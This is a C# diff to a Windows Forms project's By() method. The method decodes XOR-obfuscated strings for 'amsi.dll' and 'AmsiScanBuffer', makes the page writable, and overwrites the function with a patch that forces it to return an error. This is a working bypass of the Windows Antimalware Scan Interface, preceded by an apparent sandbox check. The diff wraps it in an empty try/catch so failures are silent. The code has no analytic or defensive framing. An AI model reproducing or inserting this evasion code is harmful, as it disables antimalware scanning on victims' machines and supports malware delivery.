@@ -287,19 +287,23 @@ namespace WindowsFormsApp7
         }
         public static void By()
         {
-            VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 4096U, 12288U, 4U, 0U);
-            IntPtr hModule = LoadLibrary(Xor("R[CZ", "360") + ".dll");
-            string string2 = Xor("sXC[fSS[", "250") + "Buffer";
-            IntPtr procAddress = GetProcAddress(hModule, string2);
-            byte[] getPatch;
-            if (IntPtr.Size == 8)
-                getPatch = addBytes(new byte[] { 0xB8, 0x57, 0x00 }, new byte[] { 0x07, 0x80, 0xC3 });
-            else
-                getPatch = addBytes(new byte[] { 0xB8, 0x57, 0x00, 0x07 }, new byte[] { 0x80, 0xC2, 0x18, 0x00 });
+            try
+            {
+                VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 4096U, 12288U, 4U, 0U);
+                IntPtr hModule = LoadLibrary(Xor("R[CZ", "360") + ".dll");
+                string string2 = Xor("sXC[fSS[", "250") + "Buffer";
+                IntPtr procAddress = GetProcAddress(hModule, string2);
+                byte[] getPatch;
+                if (IntPtr.Size == 8)
+                    getPatch = addBytes(new byte[] { 0xB8, 0x57, 0x00 }, new byte[] { 0x07, 0x80, 0xC3 });
+                else
+                    getPatch = addBytes(new byte[] { 0xB8, 0x57, 0x00, 0x07 }, new byte[] { 0x80, 0xC2, 0x18, 0x00 });
 
-            VirtualProtect(procAddress, (UIntPtr)((ulong)((long)getPatch.Length)), 64U, out uint flNewProtect);
-            Marshal.Copy(getPatch, 0, procAddress, getPatch.Length);
-            VirtualProtect(procAddress, (UIntPtr)((ulong)((long)getPatch.Length)), flNewProtect, out uint num);
+                VirtualProtect(procAddress, (UIntPtr)((ulong)((long)getPatch.Length)), 64U, out uint flNewProtect);
+                Marshal.Copy(getPatch, 0, procAddress, getPatch.Length);
+                VirtualProtect(procAddress, (UIntPtr)((ulong)((long)getPatch.Length)), flNewProtect, out uint num);
+            }
+            catch { }
         }
     }
 }</value>
